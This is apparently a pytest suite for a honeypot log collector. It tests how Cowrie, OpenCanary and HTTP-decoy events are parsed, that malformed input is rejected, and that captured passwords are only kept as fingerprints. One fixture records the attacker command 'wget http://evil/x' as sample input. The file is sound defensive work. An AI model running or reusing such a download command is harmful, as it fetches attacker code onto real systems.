"""Parser robustness and normalization (PRD T-04). Malformed input must be
contained (ParseError), never crash, and secrets must never survive parsing."""
import json

import pytest

from hlpa_collector.parsers import ParseError
from hlpa_collector.parsers import cowrie, http_decoy, opencanary


def test_cowrie_login_failed_normalized():
    line = json.dumps({"eventid": "cowrie.login.failed", "src_ip": "203.0.113.9", "src_port": 5000,
                       "dst_ip": "10.66.0.10", "dst_port": 22, "session": "s1", "protocol": "ssh",
                       "username": "root", "password": "hunter2", "timestamp": "2026-10-09T10:00:00.000000Z"})
    ev = cowrie.parse(line)
    assert ev["event_category"] == "auth_failure"
    assert ev["outcome"] == "failed"
    assert ev["src_ip"] == "203.0.113.9"
    assert ev["username"] == "root"
    # password must be fingerprinted, never stored or echoed in the message
    assert ev["credential_fp"] and ev["credential_fp"] != "hunter2"
    assert "hunter2" not in json.dumps(ev, default=str)


def test_cowrie_command_tagged_fields_present():
    line = json.dumps({"eventid": "cowrie.command.input", "src_ip": "203.0.113.9", "session": "s1",
                       "input": "wget http://evil/x", "timestamp": "2026-10-09T10:00:01Z"})
    ev = cowrie.parse(line)
    assert ev["event_category"] == "session_command"
    assert ev["command"] == "wget http://evil/x"


def test_opencanary_ftp_login():
    line = json.dumps({"logtype": 2000, "dst_host": "10.66.0.11", "dst_port": 21, "src_host": "203.0.113.5",
                       "src_port": 4444, "node_id": "canary", "utc_time": "2026-10-09 10:00:00.000000",
                       "logdata": {"USERNAME": "admin", "PASSWORD": "s3cret"}})
    ev = opencanary.parse(line)
    assert ev["service"] == "ftp"
    assert ev["event_category"] == "auth_failure"
    assert ev["username"] == "admin"
    assert ev["credential_fp"] and "s3cret" not in json.dumps(ev, default=str)


def test_http_decoy_login_attempt_keeps_only_fingerprint():
    line = json.dumps({"type": "login_attempt", "ts": "2026-10-09T10:00:00Z", "src_ip": "203.0.113.5",
                       "dst_port": 80, "username": "admin", "credential_fp": "abcd1234abcd1234",
                       "credential_len": 8, "outcome": "failed"})
    ev = http_decoy.parse(line)
    assert ev["event_category"] == "auth_failure"
    assert ev["credential_fp"] == "abcd1234abcd1234"


def test_http_decoy_egress_allowed_is_isolation_signal():
    line = json.dumps({"type": "egress_check", "ts": "2026-10-09T10:00:00Z", "target": "8.8.8.8:443",
                       "outcome": "allowed", "detail": "connected"})
    ev = http_decoy.parse(line)
    assert ev["event_category"] == "egress_attempt"
    assert ev["outcome"] == "allowed"
    assert ev["egress_target"] == "8.8.8.8:443"


@pytest.mark.parametrize("bad", ["not json", "{}", '{"eventid": null}', '[]', '{"foo":1}'])
def test_cowrie_rejects_malformed(bad):
    with pytest.raises(ParseError):
        cowrie.parse(bad)


@pytest.mark.parametrize("bad", ["", "{", '{"logtype":"notanint"}', '{"no":"logtype"}'])
def test_opencanary_rejects_malformed(bad):
    with pytest.raises(ParseError):
        opencanary.parse(bad)


def test_unknown_http_type_rejected():
    with pytest.raises(ParseError):
        http_decoy.parse(json.dumps({"type": "nonsense", "ts": "2026-10-09T10:00:00Z"}))


def test_missing_fields_stay_none_not_invented():
    line = json.dumps({"eventid": "cowrie.session.connect", "session": "s", "timestamp": "2026-10-09T10:00:00Z"})
    ev = cowrie.parse(line)
    assert ev["src_ip"] is None  # not fabricated
    assert ev["parser_status"] == "partial"


def test_timestamps_normalized_to_utc():
    line = json.dumps({"logtype": 4002, "node_id": "c", "utc_time": "2026-10-09 10:00:00.000000", "logdata": {}})
    ev = opencanary.parse(line)
    assert ev["event_time"].tzinfo is not None
    assert ev["event_time"].year == 2026
